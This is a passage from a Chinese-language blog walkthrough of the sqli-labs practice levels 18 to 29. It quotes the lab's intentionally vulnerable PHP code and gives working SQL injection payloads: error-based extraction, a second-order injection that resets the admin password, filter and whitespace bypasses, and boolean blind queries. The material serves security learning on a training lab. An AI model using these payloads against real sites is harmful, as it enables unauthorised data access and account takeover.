0,1&quot;</span>;<br><span class="hljs-variable">$result1</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row1</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result1</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row1</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;<br><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$insert</span>);<br><span class="hljs-comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br><span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your User Agent is: &#x27;</span> .<span class="hljs-variable">$uagent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;<br><span class="hljs-comment">//echo &quot;Try again looser&quot;;</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>一开始的页面，随便输一个显示本机IP，从源代码可以看出得先登陆成功才会显示uagent，就试admin，源代码不含闭合，是数字型的，试了下<code>admin or 1=1--+</code>不行，试密码吧，试来试去最后居然还是最后忘记填密码了登陆成功的。。。密码为空。。。<img src="/2023/02/09/SQLI/image-20230717133037707.png"></p><p>成功显示出uagent，看到代码这一行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br></code></pre></td></tr></table></figure><p>和上一题一样，uagent单引号闭合，没有查询语句，可以试试报错注入，因为IP变量不可控(不可按预期方法控制)，uname这里不是admin就没法登录也就没法显示uagent，指向很明确了，user agent就是注入点，单引号闭合，</p><p><img src="/2023/02/09/SQLI/image-20230717133503945.png"></p><p>成功报错，注意到原来语句的VALUE存在左括号，因此注入时要额外增加一个右括号保证语句的完整。</p><p><img src="/2023/02/09/SQLI/image-20230717133920520.png"></p><p>或者加<code>and &#39;</code><img src="/2023/02/09/SQLI/image-20230717134050816.png"></p><p>确实没密码。。。</p><p><img src="/2023/02/09/SQLI/image-20230717134452778.png"></p><p>level19和level18差不多，只是注入点从uagent变成了referer</p><p><img src="/2023/02/09/SQLI/image-20230717140539335.png"></p><h4 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  &#125;<br></code></pre></td></tr></table></figure><p>单引号闭合username&#x3D;cookie，因此只需要对cookie进行闭合后注入恶意语句即可</p><p><img src="/2023/02/09/SQLI/image-20230717144828460.png"></p><h4 id="level21"><a href="#level21" class="headerlink" title="level21:"></a>level21:</h4><p>和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为<code>&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230717150449907.png"></p><p><img src="/2023/02/09/SQLI/image-20230717150514301.png"></p><h4 id="level22："><a href="#level22：" class="headerlink" title="level22："></a>level22：</h4><p>同上题，改成双引号闭合罢了</p><p>level23：</p><p>单引号输进去报错，但是加注释报错仍然存在，看了眼源代码，注释被过滤掉了</p><p><img src="/2023/02/09/SQLI/image-20230717154027281.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<br><span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br></code></pre></td></tr></table></figure><p>emmm，当时的万能密码怎么说来着，<code>1&#39; or &#39;1&#39;=&#39;1</code>那会没去仔细深究为啥长这样，突然就明白了()，当存在注释符过滤时最后的’1会和原sql语句的引号闭合，保证sql语句的完整性</p><p>构造payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(1,(select database()))) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>或者用<span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;闭合后面的引号也行</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()))) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230717154544881.png"></p><p>这里是报错注入所以就不用太在意and、or逻辑关系</p><p>(前面报错注入做太爽了后面才注意到可以直接联合注入，无所谓，报错注入真好用)</p><h4 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h4><p>目前最牛的一级</p><p>代码审计</p><p>源代码大致有主页、修改密码、注册新用户页面。看到存在<code>mysql_escape_string()</code>过滤函数存在，开始搜寻不存在过滤的变量</p><p>诶嘿，这不是就传入了个SESSION没有过滤吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pass_change.php</span><br><br><span class="hljs-comment"># Validating the user input........</span><br><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$curr_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$re_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>并且下面的查询语句就是对<code>$username</code>变量进行查询，只要能改变这个SESSION的值便可以间接对SQL语句进行操作，但是SESSION是存放在服务端的，客户端没法直接进行修改，不急，继续看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#login.php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqllogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>   <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br>   <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br>   <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);<br>   <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-comment">//print_r($row) ;</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br><br>&#125;<br><br><span class="hljs-variable">$login</span> = <span class="hljs-title function_ invoke__">sqllogin</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$login</span>== <span class="hljs-number">0</span>) <br>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$login</span>;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);  <span class="hljs-comment">/* expire in 15 Minutes */</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: logged-in.php&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>从login.php这里的代码就能看出SESSION的值取决于变量$login的值，变量$login的值取决于用户在登录时的用户名(row的第一个字段)，那就慢慢变得有点头绪了，只要创建一个新用户，控制新用户用户名就能间接控制SESSION。进而达到控制数据库的目的。</p><p>逻辑理到这里了突然就卡壳了，受限于之前的惯性思维一直以为是要获取数据库中的数据，想了很久没想出个所以然来，去看了眼题解，发现这种注入被称为二次注入，当以<code>admin&#39;#</code>的身份登录后修改其密码，实际上就能修改admin的密码<img src="/2023/02/09/SQLI/66.png"></p><p>SQL语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#    &#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure><p>结果是打完之后忘记<code>admin&#39;#</code>的密码了。。。等我晚上重启一下数据库。。</p><p>军训归来（，新建一个新用户<code>admin&#39;#</code><img src="/2023/02/09/SQLI/image-20230717215358223.png"></p><p>用<code>admin&#39;#</code>登录<img src="/2023/02/09/SQLI/image-20230717215500916.png"></p><p>修改其密码为114514，根据sql语句分析，此时应该修改了<code>admin</code>用户的密码<img src="/2023/02/09/SQLI/image-20230717215554491.png"></p><p>成功登录admin</p><p><img src="/2023/02/09/SQLI/image-20230717215729390.png"></p><h4 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h4><p>一个简单的双写过滤，payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; anandd extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h4><p>空格过滤，or and过滤，注释符过滤</p><p>注释符过滤前面提到可以通过闭合后引号解决，空格过滤在此之前只接触过&#x2F;**&#x2F;，才疏学浅，结果发现&#x2F;**&#x2F;也被过滤了（呜呜呜呜</p><p>去找了找网上的资料，如果空格被过滤了可以用如下字符替代：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span>：非断行空格<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span>：新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：Tab(垂直)<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span>：新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span>：return<br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：Tab(水平)<br></code></pre></td></tr></table></figure><p>这里%a0和%0b可行，payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%a0anandd</span><span class="hljs-variable">%a0extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%a0database</span>())))<span class="hljs-variable">%a0oorr</span>&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-operator">=</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>在网上看到一种神奇的写法，记个笔记：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>||(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>))||<span class="hljs-string">&#x27;0 </span><br></code></pre></td></tr></table></figure><h4 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h4><p>payload：</p><p>依旧对空格过滤，但是这回上面提到的几个都行，select存在过滤，selEct大写绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>aupdatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(selEct<span class="hljs-variable">%0</span>adatabase())))<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>a&#x27;<br></code></pre></td></tr></table></figure><h4 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h4><p>没有报错信息，报错注入行不通了，试下盲注，空格依旧使用%0a过滤，payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%27</span><span class="hljs-meta">%0aand</span><span class="hljs-meta">%0alength</span>(database())=<span class="hljs-number">8</span><span class="hljs-meta">%0aor</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%271</span><span class="hljs-meta">%27</span>=<span class="hljs-meta">%272</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230718004643507.png"></p><p><img src="/2023/02/09/SQLI/image-20230718004823424.png"></p><p>这里就要注意or和and之间的逻辑关系了，上面两种是正确的注入逻辑，下面两种是错误的注入逻辑</p><p><img src="/2023/02/09/SQLI/image-20230718004737058.png"></p><p><img src="/2023/02/09/SQLI/image-20230718005009949.png"></p><p>时间盲注也行，但是可以用布尔盲注为什么要用时间盲注呢（笑</p><h4 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h4><p>测试单引号出现报错加注释报错消失，也没有任何的过滤。。</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>database())))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230718083706449.png"></p><p>Protected By The World’s Best Firewall。。。emmm</p><p>感觉没那么简单，看了眼源代码，咋还有个login.php和hacked.php，找遍网页也没出现这俩，手动进login.php，看起来像是隐藏关卡？</p><p><img src="/2023/02/09/SQLI/image-20230718084006936.png"></p><p>还多了两个pdf链接，应该是提示之类的，先不看，直接刚一下</p><p>测试了下单引号双引号闭合，都炸了，如下</p><p><img src="/2023/02/09/SQLI/image-20230718084437619.png"></p><p>啊？试了很久发现除了最中规中矩的纯数字，其他通通都会寄。。有点意思，那就看下源代码</p><p>有个白名单，如果传入不是纯数字就跳转到hacked.php，emmm…不急往下看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>&#123;<br><span class="hljs-comment">//echo &quot;you are good&quot;;</span><br><span class="hljs-comment">//return $match;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br><span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>把query_string(<code>http://host/?par1=var1&amp;par2=var2&amp;...</code>中’?’之后的部分)以’&amp;’分开然后截取每一部分的前两个字符判断是不是’id’，如果是的话截取该部分等号之后的东西。。。说了那么多，所以，不就是返回传入的参数id吗？？？？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;<br><span class="hljs-variable">$qs_array</span>= <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>&#123;<br><span class="hljs-variable">$val</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)<br>&#123;<br><span class="hljs-variable">$id_value</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>嘶。。这意思是id必须是纯数字？没法子了，网页给了两个pdf，一个404了，另一个配合我的工地英语和翻译器食用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-variable">$hint</span>=<span class="hljs-variable">$qs</span>;<br><span class="hljs-variable">$id1</span>=<span class="hljs-title 